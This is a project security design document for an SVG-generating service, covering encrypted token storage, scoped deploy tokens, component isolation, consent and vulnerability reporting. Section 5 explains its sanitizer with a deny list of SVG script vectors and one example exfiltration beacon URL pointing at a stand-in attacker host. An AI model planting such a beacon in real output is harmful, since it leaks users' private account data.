# MakeItBeauty — Security

MakeItBeauty holds credentials for other people's accounts (GitHub, and later
WakaTime, Spotify, …) and turns private-API data into world-readable images.
That combination deserves a specific, honest document, not a policy page.
This expands [architecture.md §9](architecture.md#9-security-commitments-summary-full-text-in-securitymd);
where the two disagree, fix the disagreement — they are one contract.

## 1. Token custody

Connector credentials (`ConnectorAccount.encryptedCredentials`) are
**envelope-encrypted at the application level**:

- Each credential blob is encrypted with a per-record data key (AES-256-GCM).
- Data keys are wrapped by a key-encryption key that lives in a KMS and never
  leaves it; the application requests wrap/unwrap operations, not key bytes.
- KMS access is granted to the API service identity only, and is **separate
  from database access**. A dumped database yields ciphertext; a compromised
  DB credential does not imply a KMS credential.

Full-disk or storage-layer encryption does **not** count toward this
commitment — it protects against stolen disks, not against the realistic
threat (SQL injection, leaked backup, over-privileged internal access).

## 2. Short-lived upstream tokens

We prefer credentials that expire on their own. The GitHub connector is a
**GitHub App**, not a classic OAuth App: user access tokens live 8 hours and
are renewed by a refresh worker, and permissions are fine-grained. If our
vault were breached, the stolen GitHub tokens age out in hours; the refresh
tokens are the crown jewels, and they get the same envelope-encryption
treatment plus revocation on any incident. Connectors that only offer
long-lived API keys (`api_key` tier) are accepted, but the short-lived model
is the default we design for.

## 3. Tokens never reach the browser (BFF)

The editor is a browser app, and browsers are hostile territory for secrets
(XSS, extensions, devtools). So the web app follows the
backend-for-frontend pattern: the browser holds **only a session cookie**.
All connector traffic — OAuth exchanges, token refresh, data fetches — happens
server-side in the API. There is no endpoint that returns a credential, and
no legitimate frontend feature will ever need one.

## 4. Components never see credentials

This is the load-bearing boundary of the whole design, because components are
the part of the system that third parties will eventually author.

A component never receives a token, and it also never receives raw connector
responses. The connector layer resolves data server-side and hands each
render a **filtered snapshot** containing only the fields the project's
bindings declare. A malicious or buggy component cannot leak what it was
never given.

This is enforced structurally, not by convention: v0 components are
declarative JSON fragments with no code at all (see `packages/kit`), and the
Phase 4 code-component sandbox (QuickJS in WASM) exposes no host APIs — pure
`data in → element tree out`, no network, no filesystem, no clock.

## 5. The output sanitizer is an exfiltration defense

Every rendered SVG passes an **allowlist** sanitizer that rejects `<script>`,
`<foreignObject>`, `on*` attributes, `javascript:` hrefs, and — critically —
**any reference to an external URL**. Only `data:` URIs pass.

Why external URLs are a security issue and not just a Camo-compatibility
issue: an SVG that loads `https://evil.example/p.gif?d={{github.private.field}}`
is an **exfiltration beacon** — connector data concatenated into an
attacker-chosen URL, exfiltrated by whatever renders the image outside Camo
(browsers viewing the raw file, non-GitHub embeds, local previews). A
component you installed is exactly the thing that could plant such a
reference. The sanitizer therefore treats every external reference as
hostile, regardless of intent. This gate is a security boundary, not a
linter, and it runs on every render — preview and production alike.

## 6. Deploy tokens: small blast radius by construction

The GitHub Action authenticates with a **deploy token**. Its capabilities
are deliberately minimal:

- **Per-project**: one token renders one project. It cannot enumerate or
  touch other projects, even for the same user.
- **Pull-only**: it can trigger `POST /v1/projects/{id}/render` and receive
  the SVG. It cannot read the design, the bindings, connector data beyond
  what the image itself displays, or any account state. It cannot write
  anything.
- **Revocable**: revoke it in the dashboard and mint a new one; the old one
  fails immediately (`revokedAt`).
- Stored hashed; presented tokens are verified with a constant-time compare.

A leaked deploy token therefore lets an attacker do one thing: render images
the victim was already publishing publicly (subject to per-token rate
limits). That is the intended worst case for the only secret users must
place in a third-party system (GitHub Actions secrets).

## 7. Two consent layers

Connector data ends up in a **world-readable SVG**, which is a bigger
disclosure decision than a normal OAuth grant. So consent happens twice:

1. **Connecting**: "MakeItBeauty will read: …" — the standard grant, scoped
   by the connector manifest.
2. **Binding**: "this image will PUBLICLY display: …" — shown when a project
   binds specific fields, listing exactly what will appear in the output.

The second layer exists because users reason about "app can read my data"
and "the internet can see my data" very differently, and only the second
matches what actually happens.

## 8. Future community registry

When third-party declarative components ship (Phase 3), the registry rules
are fixed now, before there is an ecosystem to grandfather in:

- **Verified namespaces**: publishing names are bound to verified identities
  (e.g. a GitHub account/org proof), so `kit/…`-style prefixes can't be
  squatted or spoofed.
- **Immutable versions**: a published version can never be changed. It can
  be yanked from discovery, but installs pin content-addressed versions.
- **No silent auto-updates**: an installed component stays at its version
  until the user explicitly updates. A compromised maintainer account cannot
  push new code (or new data-field requests) into existing profiles.

Community **connectors** are different: they run server-side with
credentials, so they are trusted code and ship only via reviewed pull
requests into this repository — never via the registry.

## 9. Reporting a vulnerability

Please report vulnerabilities privately via
**GitHub private vulnerability reporting** on this repository
(*Security → Report a vulnerability*). If that is unavailable, email
`security@makeitbeauty.dev` <!-- placeholder: confirm mailbox before launch -->.

- Please do not open public issues for security reports.
- We aim to acknowledge within 72 hours and to keep you informed through the
  fix. Coordinated disclosure is welcome; give us a reasonable window before
  publishing.
- In-scope examples: anything that breaks a boundary described above —
  credential exposure, sanitizer bypass (an external reference surviving in
  rendered output), cross-project access with a deploy token, components
  observing unfiltered data.

No bug-bounty program exists yet; reports are credited in release notes if
you wish.
